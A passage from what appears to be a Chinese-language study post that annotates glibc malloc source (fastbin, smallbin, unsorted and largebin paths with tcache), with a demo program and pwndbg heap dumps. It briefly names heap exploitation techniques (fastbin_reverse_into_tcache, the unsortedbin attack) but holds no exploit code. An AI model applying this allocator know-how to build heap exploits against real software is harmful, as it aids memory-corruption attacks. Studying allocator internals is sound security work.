<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     将请求大小转换为内部形式，通过添加 SIZE_SZ 字节的</span></span><br><span class="line"><span class="comment">     额外开销，并可能需要更多以获得必要的对齐，或</span></span><br><span class="line"><span class="comment">     至少获得 MINSIZE，即最小可分配大小。</span></span><br><span class="line"><span class="comment">     同时，checked_request2size 对于请求大小过大</span></span><br><span class="line"><span class="comment">     的情况返回 false，这样在填充和对齐后会</span></span><br><span class="line"><span class="comment">     发生零值回绕。</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!checked_request2size (bytes, &amp;nb))</span><br><span class="line">&#123;</span><br><span class="line">  __set_errno (ENOMEM);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 没有可用的内存区域。回退到 sysmalloc 从 mmap 获取一个 chunk。 */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">  <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;				\</span><br></pre></td></tr></table></figure>

<h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><p>在启用tcache的情况下，从fastbin中取出chunk:</p>
<ul>
<li>首先会在fastbin中找到所需的chunk</li>
<li>然后在tcachebin未满或这为空的情况下，会将它放入tcachebin中</li>
<li>即在tcache启用后优先从tcachebin中取出chunk给用户，所以这里就显示出了tcachebin的优先级比fastbin更高</li>
</ul>
<p>注意：</p>
<ul>
<li>因为tcache的单向链表用的头插法，头插法的特点就是如下：<ul>
<li>插入input: 10 20 30</li>
<li>遍历output：30 20 10</li>
</ul>
</li>
<li>所以这就导致了在同样size时，当tcachehbin中的chunk被取出后，若fastbin中有多个chunk，它们会逆序放入到tcachebin中</li>
</ul>
<p>攻击手法：fastbin_reverse_into_tcache</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   如果大小符合快速分配（fastbin）的条件，首先检查相应的空闲bin。</span></span><br><span class="line"><span class="comment">   这段代码即使在 av 尚未初始化的情况下也可以安全执行，因此</span></span><br><span class="line"><span class="comment">   可以在不检查的情况下尝试，这样可以节省在快速路径上的时间。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REMOVE_FB(fb, victim, pp)			\</span></span><br><span class="line"><span class="meta">  do							\</span></span><br><span class="line"><span class="meta">    &#123;							\</span></span><br><span class="line"><span class="meta">      victim = pp;					\</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (victim == NULL)				\</span></span><br><span class="line"><span class="meta">	break;						\</span></span><br><span class="line"><span class="meta">    &#125;							\</span></span><br><span class="line"><span class="meta">  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span></span><br><span class="line"><span class="meta">	 != victim);</span></span><br><span class="line"><span class="comment">// 检查请求的内存大小是否小于等于最大快速分配大小</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ()))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 计算请求大小对应的fastbin索引</span></span><br><span class="line">    idx = fastbin_index (nb);</span><br><span class="line">    mfastbinptr *fb = &amp;fastbin (av, idx); <span class="comment">// 获取相应的fastbin指针</span></span><br><span class="line">    mchunkptr pp; <span class="comment">// 定义一个指针，用于操作快速分配器中的块</span></span><br><span class="line">    victim = *fb; <span class="comment">// 从fastbin中获取一个空闲chunk</span></span><br><span class="line">    <span class="comment">// 检查是否有可用的内存块</span></span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 在单线程环境下，直接更新快速分配器指针</span></span><br><span class="line">        <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">            *fb = victim-&gt;fd; <span class="comment">// 将 fb 指向下一个空闲块</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            REMOVE_FB (fb, pp, victim); <span class="comment">// 在多线程环境下安全地移除该块</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 确保 victim 不为 NULL 以继续处理</span></span><br><span class="line">        <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 获取 victim 的大小对应的索引</span></span><br><span class="line">            <span class="type">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">            <span class="comment">// 检查 victim 的索引是否与请求的索引一致</span></span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">                <span class="comment">// 如果不一致，报告内存损坏错误</span></span><br><span class="line">                malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">            <span class="comment">// 执行对 victim 块的进一步检查，确保其可以安全使用</span></span><br><span class="line">            check_remalloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">	      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">		 stash them in the tcache.  */</span></span><br><span class="line">	      <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">		&#123;</span><br><span class="line">		  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">		  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">		  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">			 &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      <span class="keyword">if</span> (SINGLE_THREAD_P)<span class="comment">//单线程</span></span><br><span class="line">			*fb = tc_victim-&gt;fd;</span><br><span class="line">		      <span class="keyword">else</span></span><br><span class="line">			&#123;<span class="comment">//多线程操作</span></span><br><span class="line">			  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">			  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">			    <span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		      tcache_put (tc_victim, tc_idx);<span class="comment">//将victim放入tcache中</span></span><br><span class="line">		    &#125;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	      <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">	      alloc_perturb (p, bytes);</span><br><span class="line">	      <span class="keyword">return</span> p;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h3 id="smallbin"><a href="#smallbin" class="headerlink" title="smallbin"></a>smallbin</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *chunk_list[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">        chunk_list[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)</span><br><span class="line">        <span class="built_in">free</span>(chunk_list[i]);</span><br><span class="line">	<span class="built_in">free</span>(chunk_list[<span class="number">9</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_list[<span class="number">7</span>]);<span class="comment">//这个进入了smallbin</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x110</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk_list[7]进入了smallbin&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//观察源代码的执行</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);<span class="comment">//这个就是从smallbin中取出来放进tcache的</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  如果请求的内存较小，检查常规的内存池（small bins）。</span></span><br><span class="line"><span class="comment">  由于这些“smallbin”每个只包含一个大小，因此不需要在内存池内搜索。</span></span><br><span class="line"><span class="comment">  （对于较大的请求，我们需要等待unsortedbin被处理，以找到最佳匹配。</span></span><br><span class="line"><span class="comment">   但对于smallbin chunk请求，适配是准确的，因此我们现在可以检查，这样更快。）</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range(nb))  <span class="comment">// 检查请求的大小是否在smallbin范围内</span></span><br><span class="line">&#123;</span><br><span class="line">    idx = smallbin_index(nb);  <span class="comment">// 计算请求大小对应的smallbin索引</span></span><br><span class="line">    bin = bin_at(av, idx);  <span class="comment">// 获取对应的smallbin指针</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((victim = last(bin)) != bin)  <span class="comment">// 获取smllbin中的最后一个块，如果不为空</span></span><br><span class="line">    &#123;</span><br><span class="line">        bck = victim-&gt;bk;  <span class="comment">// 记录被分配chunk的后继chunk</span></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim))  <span class="comment">// 检查双向链表的完整性</span></span><br><span class="line">            malloc_printerr(<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line"></span><br><span class="line">        set_inuse_bit_at_offset(victim, nb);  <span class="comment">// 设置块状态为已使用</span></span><br><span class="line">        bin-&gt;bk = bck;  <span class="comment">// 更新小块指针</span></span><br><span class="line">        bck-&gt;fd = bin;  <span class="comment">// 维护双向链表的完整性</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)  <span class="comment">// 检查是否在主分配区</span></span><br><span class="line">            set_non_main_arena(victim);</span><br><span class="line">        </span><br><span class="line">        check_malloced_chunk(av, victim, nb);  <span class="comment">// 检查分配的块</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">        <span class="comment">/* 在这里，如果我们看到相同大小的其他块，</span></span><br><span class="line"><span class="comment">           将它们存入线程缓存（tcache）。 */</span></span><br><span class="line">        <span class="type">size_t</span> tc_idx = csize2tidx(nb);  <span class="comment">// 计算tcache索引</span></span><br><span class="line">        <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)  <span class="comment">// 检查tcache是否有效</span></span><br><span class="line">        &#123;</span><br><span class="line">            mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* 当小块不为空且线程缓存未满时，复制块。 */</span></span><br><span class="line">            <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">                &amp;&amp; (tc_victim = last(bin)) != bin)  <span class="comment">// 获取小块列表中的最后一个块</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)  <span class="comment">// 检查块是否有效</span></span><br><span class="line">                &#123;</span><br><span class="line">                    bck = tc_victim-&gt;bk;  <span class="comment">// 获取块的后继块</span></span><br><span class="line">                    set_inuse_bit_at_offset(tc_victim, nb);  <span class="comment">// 设置状态为已使用</span></span><br><span class="line">                    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                        set_non_main_arena(tc_victim);  <span class="comment">// 更新非主分配区标志</span></span><br><span class="line"></span><br><span class="line">                    bin-&gt;bk = bck;  <span class="comment">// 更新小块指针</span></span><br><span class="line">                    bck-&gt;fd = bin;  <span class="comment">// 维护双向链表的完整性</span></span><br><span class="line"></span><br><span class="line">                    tcache_put(tc_victim, tc_idx);  <span class="comment">// 将victim放入tcache中</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="type">void</span> *p = chunk2mem(victim);  </span><br><span class="line">        alloc_perturb(p, bytes);  </span><br><span class="line">        <span class="keyword">return</span> p;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="largebin"><a href="#largebin" class="headerlink" title="largebin"></a>largebin</h3><p>首先处理unsortedbin中的空闲chunk</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  如果这是一个大请求，在继续之前合并快速块（fastbins）。</span></span><br><span class="line"><span class="comment">  虽然在查看是否有可用空间之前处理所有快速块看起来有些过度，</span></span><br><span class="line"><span class="comment">  但这样可以避免通常与快速块相关的碎片问题。</span></span><br><span class="line"><span class="comment">  此外，实际上，程序倾向于连续产生小请求或大请求，</span></span><br><span class="line"><span class="comment">  而不常出现混合请求，因此在大多数程序中，</span></span><br><span class="line"><span class="comment">  不会频繁调用合并操作。而在那些频繁调用合并操作的程序</span></span><br><span class="line"><span class="comment">  中，往往会导致内存碎片。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    idx = largebin_index(nb);  <span class="comment">// 计算请求大小对应的大块索引</span></span><br><span class="line">    <span class="keyword">if</span> (atomic_load_relaxed(&amp;av-&gt;have_fastchunks))  <span class="comment">// 检查fastbin中是否存在空闲chunk</span></span><br><span class="line">        malloc_consolidate(av);  <span class="comment">// 合并fastbin的空闲chunk</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  处理最近释放或剩余的内存块，仅在块完全匹配时才取用，</span></span><br><span class="line"><span class="comment">  或者如果这是一个小请求，则取用从最近的非完全匹配中剩余的块。</span></span><br><span class="line"><span class="comment">  将其他遍历到的块放入合适的池中。</span></span><br><span class="line"><span class="comment">  请注意，这个步骤是在任何例程中唯一将块放入池中的地方。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  这里的外部循环是必要的，因为我们可能直到 malloc 接近结束时</span></span><br><span class="line"><span class="comment">  才意识到我们应该合并，因此必须执行合并并重试。</span></span><br><span class="line"><span class="comment">  这最多发生一次，并且只在我们需要扩展内存以满足“小”请求时。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  INTERNAL_SIZE_T tcache_nb = <span class="number">0</span>;  <span class="comment">// 用于缓存的块大小</span></span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx(nb);  <span class="comment">// 将请求大小转换为tcache索引</span></span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)  <span class="comment">// 检查缓存是否启用并且索引有效</span></span><br><span class="line">    tcache_nb = nb;  <span class="comment">// 设置缓存块大小</span></span><br><span class="line">  <span class="type">int</span> return_cached = <span class="number">0</span>;  <span class="comment">// 标记返回缓存块的状态</span></span><br><span class="line"></span><br><span class="line">  tcache_unsorted_count = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>项目</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>unsorted_chunks(av)</code></td>
<td>获取 unsorted bin 的链表头（伪 chunk），位于 <code>main_arena</code> 固定偏移处</td>
</tr>
<tr>
<td>循环条件</td>
<td>遍历 unsorted bin 中的真实 chunk，<strong>逆序处理</strong>直到链表头</td>
</tr>
<tr>
<td>链表头特性</td>
<td><code>fd</code> 指向第一个真实 chunk，<code>bk</code> 指向最后一个真实 chunk</td>
</tr>
</tbody></table>
<p>首先要搞明白一个宏<code>unsorted_chunks(av)</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">unsorted_chunks(av) = bin_at(av, <span class="number">1</span>)</span><br><span class="line">                    = (<span class="type">char</span>*)&amp;av-&gt;bins[(<span class="number">1</span><span class="number">-1</span>)*<span class="number">2</span>] - offsetof(malloc_chunk, fd)</span><br><span class="line">                    = (<span class="type">char</span>*)&amp;av-&gt;bins[<span class="number">0</span>] - <span class="number">0x10</span>  <span class="comment">// 因 malloc_chunk.fd 偏移为 0x10</span></span><br><span class="line">                    = main_arena + <span class="number">0x58</span> - <span class="number">0x10</span>    </span><br><span class="line">                    = main_arena + <span class="number">0x48</span>           <span class="comment">//这个是main_arena+88的head</span></span><br></pre></td></tr></table></figure>

<p>下面的源代码实现从 last remainder chunk，large bins 和top chunk 中分配所需的 chunk， 这里包含了多个多层循环，在这些循环中，主要工作是分配前两步都未分配成功的 small bin chunk，large bin chunk 和 large chunk。最外层的循环用于重新尝试分配 small bin chunk，因 为如果在前一步分配small bin chunk 不成功，并没有调用 malloc_consolidate()函数合并 fast bins 中的 chunk，将空闲 chunk 加入 unsorted bin 中，如果第一尝试从 last remainder chunk， top chunk 中分配 small bin chunk 都失败以后，如果 fast bins 中存在空闲 chunk，会调用 malloc_consolidate()函数，那么在 usorted bin 中就可能存在合适的 small bin chunk 供分配， 所以需要再次尝试。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )<span class="comment">//遍历unsortedbin</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> iters = <span class="number">0</span>;<span class="comment">//记录循环的次数</span></span><br><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">      &#123;<span class="comment">//逆序</span></span><br><span class="line">        bck = victim-&gt;bk; <span class="comment">//bck需要注意</span></span><br><span class="line">        size = chunksize (victim);</span><br><span class="line">        mchunkptr next = chunk_at_offset (victim, size);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (size &lt;= <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">            || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">          malloc_printerr (<span class="string">&quot;malloc(): invalid size (unsorted)&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">            || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">          malloc_printerr (<span class="string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))</span><br><span class="line">          malloc_printerr (<span class="string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class="line">            || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">          malloc_printerr (<span class="string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (prev_inuse (next)))</span><br><span class="line">          malloc_printerr (<span class="string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);</span><br><span class="line">        <span class="comment">/* </span></span><br><span class="line"><span class="comment">             如果是小内存请求，且unsorted bin中仅存最后一个剩余块（last_remainder），</span></span><br><span class="line"><span class="comment">             则尝试使用它。这有助于提升连续小内存请求的局部性。</span></span><br><span class="line"><span class="comment">             这是最佳适配策略的唯一例外，且仅适用于小内存块没有精确匹配的情况。</span></span><br><span class="line"><span class="comment">          */</span></span><br><span class="line">         <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<span class="comment">//判断是否需要分配一个small bin chunk</span></span><br><span class="line">            bck == unsorted_chunks (av) &amp;&amp;<span class="comment">//unsortedbin中只有一个chunk</span></span><br><span class="line">            victim == av-&gt;last_remainder &amp;&amp;<span class="comment">//并且这个chunk为last_remainder chunk</span></span><br><span class="line">            (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))<span class="comment">//且大于所需chunk的size加上MINSIZE</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">            remainder_size = size - nb;<span class="comment">//计算切分后剩下的chunk大小</span></span><br><span class="line">            remainder = chunk_at_offset (victim, nb);</span><br><span class="line">            unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">            av-&gt;last_remainder = remainder;</span><br><span class="line">            remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<span class="comment">//链入unsortedbin中</span></span><br><span class="line">            <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">              &#123;<span class="comment">//如果属于largebin chunk将该chunk的fd_nextsize和bk_nextsize设置为NULL</span></span><br><span class="line">                remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">              &#125;</span><br><span class="line">	  <span class="comment">//设置分配出的chunk和last_remainder chunk的相关信息</span></span><br><span class="line">            set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                      (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">            set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">            set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">            check_malloced_chunk (av, victim, nb);</span><br><span class="line">            <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">          &#125;<span class="comment">//返回应用层，退出</span></span><br></pre></td></tr></table></figure>

<p>原unsortedbin_attack（向任意地址即bck的fd写入main_arena+88），因加了这个检查后就用不了了</p>
<p>若前面仍未完成分配，则将usnortedbin中最后一个chunk拿出来若与所需大小一致，将当前chunk返回，否则分类并归位。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>

<p>启用tcache，将chunk先放入tcache中，再返回给给用户，当tcache满的时候才直接返回给用户</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">		set_non_main_arena (victim);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">	      <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment">		 We may return one of these chunks later.  */</span></span><br><span class="line">	      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">		  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">		&#123;</span><br><span class="line">		  tcache_put (victim, tc_idx);</span><br><span class="line">		  return_cached = <span class="number">1</span>;</span><br><span class="line">		  <span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	      <span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>开始归为前面遍历到但不符合需求的chunk。</p>
<p>如果当前 chunk 属于small bins，获得当前 chunk 所属small bin 的 index，并将该 small bin 的链表表头赋值给 bck，第一个 chunk 赋值给 fwd，也就是当前的 chunk 会插入到 bck 和 fwd 之间，作为small bin 链表的第一个 chunk。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = smallbin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>如果当前 chunk 属于 large bins，获得当前 chunk 所属 large bin 的 index，并将该 large bin 的链表表头赋值给 bck，第一个 chunk 赋值给 fwd，也就是当前的 chunk 会插入到 bck 和 fwd 之间，作为 large bin 链表的第一个 chunk。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd</span><br></pre></td></tr></table></figure>

<p>如果fwd 不等于 bck，意味着<strong>large bin 中有空闲chunk 存在</strong>，由于large bin 中的空闲chunk 是按照大小顺序排序的，需要将当前从 unsorted bin 中取出的 chunk 插入到 large bin 中合适 的位置。将当前 chunk 的 size 的 inuse 标志 bit 置位，相当于加 1，便于加快 chunk 大小的比 较，找到合适的地方插入当前 chunk。这里还做了一次检查，断言在 large bin 双向循环链表 中的最后一个 chunk的 size 字段中的非主分配区的标志 bit没有置位，因为所有在 large bin 中的 chunk 都处于空闲状态，该标志位一定是清零的。</p>
<hr>
<p>根据内存结构理解largebin的fd和bk</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">largebins</span><br><span class="line">0x400-0x430: 0x1f2ae850 —▸ 0x1f2ae420 —▸ 0x1f2ae000 —▸ 0x7f5cf0f79f68 (main_arena+1096) ◂— 0x1f2ae850</span><br><span class="line">pwndbg&gt; x/10gx 0x1f2ae850 <span class="comment">#最大 </span></span><br><span class="line">0x1f2ae850:     0x0000000000000000      0x0000000000000421</span><br><span class="line">0x1f2ae860:     0x000000001f2ae420      0x00007f5cf0f79f68#bk-&gt;main_arena+1096</span><br><span class="line">0x1f2ae870:     0x000000001f2ae420      0x000000001f2ae000</span><br><span class="line">0x1f2ae880:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0x1f2ae890:     0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x1f2ae420 <span class="comment"># fd_nextsize-&gt;小的 bk_nextsize-&gt;大的</span></span><br><span class="line">0x1f2ae420:     0x0000000000000000      0x0000000000000411</span><br><span class="line">0x1f2ae430:     0x000000001f2ae000      0x000000001f2ae850</span><br><span class="line">0x1f2ae440:     0x000000001f2ae000      0x000000001f2ae850</span><br><span class="line">0x1f2ae450:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0x1f2ae460:     0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x1f2ae000 <span class="comment"># 最小</span></span><br><span class="line">0x1f2ae000:     0x0000000000000000      0x0000000000000401</span><br><span class="line">0x1f2ae010:     0x00007f5cf0f79f68      0x000000001f2ae420#fd-&gt;main_arena+1096</span><br><span class="line">0x1f2ae020:     0x000000001f2ae850      0x000000001f2ae420</span><br><span class="line">0x1f2ae030:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0x1f2ae040:     0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x7f5cf0f79f68 <span class="comment">#头节点  fd-&gt;最大  bk-&gt;最小</span></span><br><span class="line">0x7f5cf0f79f68 &lt;main_arena+1096&gt;:       0x00007f5cf0f79f58      0x00007f5cf0f79f58</span><br><span class="line">0x7f5cf0f79f78 &lt;main_arena+1112&gt;:       